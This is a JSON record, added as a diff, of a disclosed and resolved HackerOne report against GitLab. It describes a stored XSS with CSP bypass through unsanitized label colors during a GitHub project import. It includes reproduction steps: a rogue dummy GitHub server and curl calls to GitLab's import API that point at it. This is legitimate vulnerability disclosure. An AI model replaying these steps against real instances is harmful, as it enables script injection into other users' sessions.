@@ -1,0 +1,143 @@
+{
+  "id": 1665658,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjY1NjU4",
+  "url": "https://hackerone.com/reports/1665658",
+  "title": "Stored-XSS with CSP-bypass via labels' color",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2022-08-10T15:47:55.330Z",
+  "submitted_at": "2022-08-10T15:47:55.453Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "yvvdwf",
+    "url": "/yvvdwf",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ubqmt760dugarh527x4qc4mkdn4n/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 264,
+    "url": "https://hackerone.com/gitlab",
+    "handle": "gitlab",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "GitLab",
+      "twitter_handle": "gitlab",
+      "website": "https://about.gitlab.com",
+      "about": "A single application for the entire software development lifecycle."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2023-02-19T22:44:01.783Z",
+  "bug_reporter_agreed_on_going_public_at": "2023-02-05T10:42:08.979Z",
+  "team_member_agreed_on_going_public_at": "2023-02-19T22:44:01.561Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Gitlab allows to import a project from Github. It imports also the labels whose colors are not sanitized. This leads to Stored-XSS. \n\n\n# Step to reproduce\n\nTo reproduce, we need the following prerequisite: \n\n- Github does not allow neither to create arbitrary label colors. You can find in the attachment a dummy Github server\n- A VM/machine to host the dummy server above with an public IP though that gitlab.com can access to.\n- I created the dummy server using nodejs, so you need to have also nodejs on the machine\n- A Gitlab personal access token. Go [here](https://gitlab.com/-/profile/personal_access_tokens?name=test&scopes=api) to create a new token with within `api` scope.\n\n\n# Step 1: run the dummy server\n\n- Copy the attachment file on your machine and decompress it to any folder, e.g., `/tmp/dummy-server`\n- Go to `/tmp/dummy-server` then run this command: `node ./index.js YOUR_IP YOUR_PORT` in which, you should replace `IP` and `PORT` with the one you have. For example, `sudo node index.js 51.75.74.52 80`\n\n# Step 2: trigger Gitlab import\n\n- Open a new terminal, then run the following command in which:\n\n   + `YOUR_IP` and `YOUR_PORT` by the values in the previous step\n   + `YOUR_GITLAB_TOKEN` is the api token you've created in the pre-requirement\n   + `YOUR_GITLAB_USERNAME` is the target namespace you want to import the project to. It can be your username, or a group name\n\n```bash\ncurl -kv \"https://gitlab.com/api/v4/import/github\" \\\n  --request POST \\\n  --header \"content-type: application/json\" \\\n  --header \"PRIVATE-TOKEN: YOUR_GITLAB_TOKEN\" \\\n  --data '{\n    \"personal_access_token\": \"ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\",\n    \"repo_id\": \"523303538\",\n    \"target_namespace\": \"YOUR_GITLAB_USERNAME\",\n    \"new_name\": \"xss-on-label-color\",\n    \"github_hostname\": \"http://YOUR_IP:YOUR_PORT\"\n}'\n```\n\nFor example:\n\n```bash\ncurl -kv \"https://gitlab.com/api/v4/import/github\" \\\n  --request POST \\\n  --header \"content-type: application/json\" \\\n  --header \"PRIVATE-TOKEN: AAAAAAAAAAAAAYYYYabc\" \\\n  --data '{\n    \"personal_access_token\": \"ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\",\n    \"repo_id\": \"523303538\",\n    \"target_namespace\": \"yvvdwf\",\n    \"new_name\": \"xss-on-label-color\",\n    \"github_hostname\": \"http://51.75.74.52:80\"\n}'\n```\n\nAfter finishing, you can view the list of the labels of the imported project. You should see an popup created by this js `alert(document.domain)`\n\nAn example is available here (private project): https://gitlab.com/yvvdwf/xss-on-label-color/-/labels\n\n\n# Impact\n\nStored-XSS with CSP-bypass allows attackers to execute arbitrary actions on behalf of victims at the client side.\n\n## Impact\n\nStored-XSS with CSP-bypass allows attackers to execute arbitrary actions on behalf of victims at the client side.",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1861721,
+      "file_name": "dummy-server.tar.gz",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/seencxtqs223ihcz56wv2cum4yev?response-content-disposition=attachment%3B%20filename%3D%22dummy-server.tar.gz%22%3B%20filename%2A%3DUTF-8%27%27dummy-server.tar.gz&response-content-type=application%2Fgzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4YX5O5ZF%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T150809Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJIMEYCIQDrYBeAJmfSrho%2Fo3ydnTGHZMgciTMqd4s%2Bi3051FSKHgIhAN%2FdIMNF5zpPzmkTCuBvT9Wwg6%2BYPipU4qDbZUf6MgabKrsFCOf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgzfN8V2bGEkvwhLB0kqjwWN33cGXQ27qYU0ULk0RZRtollgj3I4%2Ff6knuECYYSVHehNm2%2B%2Fls7yT30bRpwXecZ3wjyRR%2BAzMITbfQLLClMHTqk1jH6wJ%2FDrBoOZqOWDJrSp8LgXLh6scwpYmDo9Hc1ALh8lEF9FeL44n8eOGeB114eipW938o11kbmQVbUtKKgCj1YIBtaj3vBVV0IvVZLuRmJ3jHgEEeZzzPzpwQNrpsNgIBhhB09SKf7ZvBYtIbIfdw4MB1kfD5KK3Z0ai%2F95OBUwAeF6qlhWjm1M78CzXMmAl5gT8zrMnypwfOnh94r7pQ136w2yrMg7sPJ%2Ffzv%2F%2BAms%2BMpFvwwCaXSjlInkf2QyNp0Zt8AvRKeVPIOn6jda3HVmddIvrxZKTkZyPZLXlmy2c4oB4A8tjtCoHU2T6pJ5ZPHyI%2B0npv3AFnS78y2Ug8pMuyNwT0l4kL0eDZfSuIdKUj3ryKV3f4h2iq8v%2B9NyOLtSC%2BeKt6zRkj3DiQls0F1uSwh0mmdQpvsYT9pUdguU5CloLGghU7T2luGNv%2B6MjD3%2F1NkmjtPhVbdznLFzz87yzIKw8ZqGDuAdRpzq8ogeeNGJWapah9MYNyqq%2BjlZSh%2FHhfljggs9NHM30yYDFIKX5fD5px9Xk9aeC0X%2BZLBb6EtPjCYF7VOLPQv8Pti7O3ZRkU6mU16yzQW7XZKW5hXR%2FZQiJ1Yg7tD5CZLbgrqihMnsTwtlaXsR9addX9QIGqbPDtXGVrnfW2UR4%2BVqdyHMJEBaMtZzE9L9Mw%2F%2Bn23pQPCzO4TuWn9H1qq6%2BMQzRxD57u4PMawcWNGm6D4y3f7LACfZn0SpaI5FzCvnkskUwGqQmGou9Z%2BK3CsyxGBAEFfYhIqkqWc2ySoeMJaF%2Fc8GOrAB7waFHxH8Hmo9bqH27gqSdTMqs%2BfaICaBZ8KzmWuW0vcV%2BCYZ3FOkuY3zZjc6d%2Brhch4OmCIQ%2B%2BNVw1M4qseGerzWSJi4vGMFEBHgHc3HN0SCZlJhoY%2BTkgIbKDqtiHbj35Mz7TZl0x6zJV9zMewjuK%2F4TU2o1kKVImQhqlOREgbl%2FLkzX2CUHFMDioplV6oNKyjke26FEK6Y%2B%2BFquOsVXxzKKXRxUQ3eN4OcaIA7GJk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d06dd3cae09a82eea523cdd613d05ee0e7d12ad8d546f1ffce0c04cc6d6d2915",
+      "file_size": 3431,
+      "type": "application/gzip",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 169,
+  "voters": [
+    "noobroot",
+    "muthu_prakash",
+    "fgolshani",
+    "viridian_40826d",
+    "maxcappa",
+    "daemoon",
+    "0xbedo",
+    "colonel007",
+    "alganad",
+    "ejc",
+    "and 159 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.7,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "required",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 18138,
+    "asset_type": "URL",
+    "asset_identifier": "gitlab.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
